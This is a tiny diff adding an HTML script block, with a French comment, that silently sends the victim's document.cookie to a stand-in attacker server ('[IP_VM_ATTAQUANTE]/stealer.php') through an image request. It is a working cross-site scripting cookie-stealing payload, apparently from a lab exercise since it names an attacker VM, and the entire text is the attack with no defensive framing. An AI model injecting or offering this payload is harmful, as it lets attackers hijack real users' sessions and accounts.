@@ -1,0 +1,4 @@
+<script>
+    // Envoie discrètement une requête vers ton serveur d'écoute avec le cookie de la victime
+    new Image().src = "http://[IP_VM_ATTAQUANTE]/stealer.php?c=" + encodeURIComponent(document.cookie);
+</script>
